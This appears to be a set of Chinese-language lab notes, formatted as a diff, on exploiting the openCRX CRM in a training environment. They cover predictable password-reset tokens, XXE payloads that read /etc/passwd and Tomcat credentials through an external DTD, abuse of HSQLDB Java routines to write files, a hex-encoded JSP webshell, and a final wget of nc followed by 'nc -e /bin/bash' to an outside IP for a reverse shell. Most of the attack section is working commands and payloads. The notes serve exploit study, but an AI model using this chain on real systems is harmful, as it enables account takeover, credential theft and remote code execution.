@@ -1,0 +1,198 @@
+1.ssh student@192.168.147.126
+cd crx/apache-tomee-plus-7.0.5/bin
+./opencrx.sh run
+2.cd crx/apache-tomee-plus-7.0.5/
+3.tree -L 3
+可以看到apps下面放者所有的java所需要的war包
+4.opencrx-core-CRX.ear是壓縮了所有war包的壓縮檔,使用scp將opencrx-core-CRX.ear傳回本地
+5.將opencrx-core-CRX.ear解壓縮
+unzip opencrx-core-CRX.ear
+6.開啟jd-gui
+java -jar jd-gui-1.6.6-min.jar
+7.打開opencrx-core-CRX.war
+WEB-INE下的web.xml可以查看url mapping
+8.jsp資料夾中可以查看到登入及密碼重置的jsp
+9.首先查看密碼重置的RequestPasswordReset.jsp文件,是怎麼實現重置密碼的
+10.在56-65行中間定義了引入的class,其中64行import了opencrx.kernel.generic.*
+    56 %><%@ page session="true" import="
+    57 java.util.*,
+    58 java.net.*,
+    59 java.util.Enumeration,
+    60 java.io.PrintWriter,
+    61 org.w3c.spi2.*,
+    62 org.openmdx.portal.servlet.*,
+    63 org.openmdx.base.naming.*,
+    64 org.opencrx.kernel.generic.*
+    65 "%>
+11.主要的密碼重置代碼從153行開始,其中153行的三個條件必須不等於空,才能執行到這下面的userHome.requestPasswordReset()方法
+	if(principalName != null && providerName != null && segmentName != null) {
+		javax.jdo.PersistenceManagerFactory pmf = org.opencrx.kernel.utils.Utils.getPersistenceManagerFactory();
+		javax.jdo.PersistenceManager pm = pmf.getPersistenceManager(
+			SecurityKeys.ADMIN_PRINCIPAL + SecurityKeys.ID_SEPARATOR + segmentName,
+			null
+		);
+		try {
+			org.opencrx.kernel.home1.jmi1.UserHome userHome = (org.opencrx.kernel.home1.jmi1.UserHome)pm.getObjectById(
+				new Path("xri://@openmdx*org.opencrx.kernel.home1").getDescendant("provider", providerName, "segment", segmentName, "userHome", principalName)
+			);
+			pm.currentTransaction().begin();
+			userHome.requestPasswordReset();
+			pm.currentTransaction().commit();
+			success = true;
+		} catch(Exception e) {
+			try {
+				pm.currentTransaction().rollback();
+			} catch(Exception ignore) {}
+			success = false;
+		}
+	} else {
+		success = false;
+12.查找userHome.requestPasswordReset()方法,在160行寫了userHome導入的地方
+org.opencrx.kernel.home1.jmi1.UserHome userHome
+在opencrx-core-CRX.ear解壓後,裡面有個META-INF/application.xml,裡面的100行定義了額外的library目錄
+<library-directory>APP-INF/lib</library-directory>
+13.找到UserHome.class裡面定義了UserHmoe,但這裡只定義了interface,只定義行為,沒有定義實際方法,沒有定義實際執行的代碼
+14.搜索可能調用requestPasswordReset的方法地方,找到五個結果,其中UserHomeImpI.class代表這檔案是執行implement Interface
+15.在UserHomeImpI.class找到定義了requestPasswordReset的方法,點擊方法會找回到UserHome.class的324行方法
+16.在該方法中338行有定義了token random產生的規則
+String resetToken = Utils.getRandomBase62(40);
+17.點擊getRandomBase62會跳轉到utils.class的1038行
+18.使用jshell,實現random
+jshell
+import java.util.Random;
+jshell> Random r1 = new Random(42);
+jshell> Random r2 = new Random(42);
+jshell> int x,y;
+for(int i=0; i<10; i++) { x = r1.nextInt(); y = r2.nextInt(); if(x == y){
+System.out.println("They match! " + x);}}
+19.使用jshell,SecureRandom
+import java.security.SecureRandom;
+byte[] s = new byte[] { (byte) 0x2a }
+SecureRandom r1 = new SecureRandom(s);
+SecureRandom r2 = new SecureRandom(s);
+if(r1.nextInt() == r2.nextInt()) { System.out.println("They match!"); } else {
+System.out.println("No match."); }
+20.以下是從burp抓出來的請求
+curl -i -s -k -X $'POST' \
+    -H $'Host: opencrx:8080' -H $'Content-Length: 8' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://opencrx:8080' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Referer: http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7' -H $'Connection: close' \
+    -b $'JSESSIONID=B6C13156BA603082051C9845AF3C89B6' \
+    --data-binary $'id=guest' \
+    $'http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp'
+21.取得時間點
+perl -MTime::HiRes -e 'printf("%.0f\n",Time::HiRes::time()*1000)' && curl -s -i -X 'POST' --data-binary 'id=admin-Standard' 'http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp' && perl -MTime::HiRes -e 'printf("%.0f\n",Time::HiRes::time()*1000)'
+16334047678632
+16334047686251
+22.將返回的機器時間轉乘timebase,https://www.epochconverter.com/
+Date: Sun, 03 Oct 2021 08:32:26 GMT
+Epoch timestamp: 1633249946
+Timestamp in milliseconds: 1633249946000
+23.編譯java
+javac OpenCRXToken.java
+24.生成tokens list
+java OpenCRXToken > tokens.txt
+25.在頁面上可以看到
+<input type="text" name="id" id="id" autofocus="" placeholder="e-mail address, login or ID (e.g. guest@ProviderName/SegmentName)" class="form-control">
+26.在這支opencrx-core-CRX.war裡面的WizardInvoker.jsp 可以看到
+Example:
+http://localhost:8080/opencrx-core-CRX/WizardInvoker.jsp?wizard=/wizards/en_US/UploadMedia.jsp&provider=CRX&segment=Standard&xri=xri://@openmdx*org.opencrx.kernel.home1/provider/CRX/segment/Standard&user=wfro&password=.
+provider: provider name
+segment: segment name
+
+
+27.XML格式可以區分三種Internal Entities,External Entities,Parameter Entities
+Internal Entities範例
+<!ENTITY test "<entity-value>test value</entity-value>">
+External Entities又可以分為private External Entities及public External Entities
+private External Entities範例,通常用於私人調用,中間的SYSTEM寫明了指定用戶或群組
+<!ENTITY offsecinfo SYSTEM "http://www.offsec.com/company.xml">
+public External Entities範例,中間的PUBLIC為公開調用的ID
+<!ENTITY offsecinfo PUBLIC "-//W3C//TEXT companyinfo//EN" "http://www.offsec.com/companyinfo.xml">
+Parameter Entities範例,通常以%號出現
+<!ENTITY % course 'AWAE'>
+<!ENTITY Title 'Offensive Security presents %course;' >
+
+
+28.根據openCRX官網範例的正常請求account
+<?xml version="1.0"?>
+<org.opencrx.kernel.account1.Contact>
+ <lastName>REST</lastName>
+ <firstName>Test #1</firstName>
+</org.opencrx.kernel.account1.Contact>
+29.修改後請求驗證是否可以替換中間參數
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data ANY >
+<!ENTITY lastname "Replaced">
+]>
+<org.opencrx.kernel.account1.Contact>
+ <lastName>&lastname;</lastName>
+ <firstName>Tom</firstName>
+</org.opencrx.kernel.account1.Contact>
+30. 28及29步驟確認了internal Entities 可以正常被執行替換
+31.嘗試使用External Entities讀取/etc/passwd,可以看到部分內容,但因內容過長超出SQL的欄位,所以有報錯
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data ANY >
+<!ENTITY lastname SYSTEM "file:///etc/passwd">
+]>
+<org.opencrx.kernel.account1.Contact>
+ <lastName>&lastname;</lastName>
+ <firstName>Tom</firstName>
+</org.opencrx.kernel.account1.Contact>
+
+32.本地建立wrapper.dtd,讓XXE請求回來,整段語法長<![CDATA[SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/conf/tomcatusers.xml]]>
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % file SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/conf/tomcatusers.xml" >
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "http://192.168.119.120/wrapper.dtd" >
+%dtd;
+]>
+<org.opencrx.kernel.account1.Contact>
+ <lastName>&wrapper;</lastName>
+ <firstName>Tom</firstName>
+</org.opencrx.kernel.account1.Contact>
+
+
+"crx.lck\ncrx.log\ncrx.properties\ncrx.script\ncrx.tmp\ndb.bat\ndb.sh\ndbmanager.bat\ndbmanager.sh\nhsqldb.ico\nhsqldb.jar\nsqltool.jar\nsqltool.rc\n, Tom"
+
+33.查看到HSQLDB帳號密碼
+/home/student/crx/data/hsqldb/dbmanager.sh
+34.上官網下載HSQLDB的client使用以下命令連入DB
+java -cp hsqldb.jar org.hsqldb.util.DatabaseManagerSwing --url jdbc:hsqldb:hsql://opencrx:9001/CRX --user sa --password manager99
+34.創建一個systemprop的方法,需要傳入的參數是key,當作變數名為VARCHAR,然後返回VARCHAR
+CREATE FUNCTION systemprop(IN key VARCHAR) RETURNS VARCHAR
+ LANGUAGE JAVA
+ DETERMINISTIC NO SQL
+ EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'
+35.執行systemprop這方法,給入變數是java.class.path,返回java.class.path變量
+VALUES(systemprop('java.class.path'))
+36.需要找的可以執行惡意程序的方法,需要以下四項條件
+1. The method must be static.
+2. The method parameters must be primitives or types that map to SQL types.
+3. The method must return a primitive, an object that maps to a SQL type, or void.
+4. The method must run code directly or write files to the system
+37.將java內建的routine jar包轉回本地
+/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar
+38.使用jd-gui反編譯將source code導出
+39.根據source code查找適當可執行惡意的程序的方法,搜索關鍵字,找到writeBytesToFilename這方法
+public static void \w+\(string
+40.創建一個程序名為PROCEDURE,使用了writeBytesToFilename方法,定義參數長度1024
+CREATE PROCEDURE writeBytesToFilename(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))
+ LANGUAGE JAVA
+ DETERMINISTIC NO SQL
+ EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
+41.使用該方法創建文件
+call writeBytesToFilename('test.txt', cast ('497420776f726b656421' AS VARBINARY(1024)))
+42.查看程序執行路徑
+VALUES(systemprop('user.dir'))
+/home/student/crx/data/hsqldb
+43.將cmd.jsp調整後做ascii編碼
+3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a20202020537472696e6720636d64203d20726571756573742e676574506172616d657465722822636d6422293b0a20202020537472696e67206f7574707574203d2022223b0a0a20202020696628636d6420213d206e756c6c29207b0a2020202020202020537472696e672073203d206e756c6c3b0a2020202020202020747279207b0a20202020202020202020202050726f636573732070203d2052756e74696d652e67657452756e74696d6528292e6578656328636d64293b0a2020202020202020202020204275666665726564526561646572207349203d206e6577204275666665726564526561646572286e657720496e70757453747265616d52656164657228702e676574496e70757453747265616d282929293b0a2020202020202020202020207768696c65282873203d2073492e726561644c696e6528292920213d206e756c6c29207b0a202020202020202020202020202020206f7574707574202b3d20733b0a2020202020202020202020207d0a20202020202020207d0a2020202020202020636174636828494f457863657074696f6e206529207b0a202020202020202020202020652e7072696e74537461636b547261636528293b0a20202020202020207d0a202020207d0a253e0a0a3c7072653e0a3c253d6f757470757420253e0a3c2f7072653e
+44.將cmdjsp.jsp寫入web目錄
+call writeBytesToFilename('../../apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/shell.jsp', cast ('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a20202020537472696e6720636d64203d20726571756573742e676574506172616d657465722822636d6422293b0a20202020537472696e67206f7574707574203d2022223b0a0a20202020696628636d6420213d206e756c6c29207b0a2020202020202020537472696e672073203d206e756c6c3b0a2020202020202020747279207b0a20202020202020202020202050726f636573732070203d2052756e74696d652e67657452756e74696d6528292e6578656328636d64293b0a2020202020202020202020204275666665726564526561646572207349203d206e6577204275666665726564526561646572286e657720496e70757453747265616d52656164657228702e676574496e70757453747265616d282929293b0a2020202020202020202020207768696c65282873203d2073492e726561644c696e6528292920213d206e756c6c29207b0a202020202020202020202020202020206f7574707574202b3d20733b0a2020202020202020202020207d0a20202020202020207d0a2020202020202020636174636828494f457863657074696f6e206529207b0a202020202020202020202020652e7072696e74537461636b547261636528293b0a20202020202020207d0a202020207d0a253e0a0a3c7072653e0a3c253d6f757470757420253e0a3c2f7072653e' AS VARBINARY(1024)))
+45.取得webshell後將nc binary下載到機器上,給予執行權限後執行,取得reverse shell,(需使用burp做 urlencode)
+wget+http%3a//192.168.119.147/nc
+chmod+%2bx+nc
+./nc+-e+/bin/bash+192.168.119.147+4444
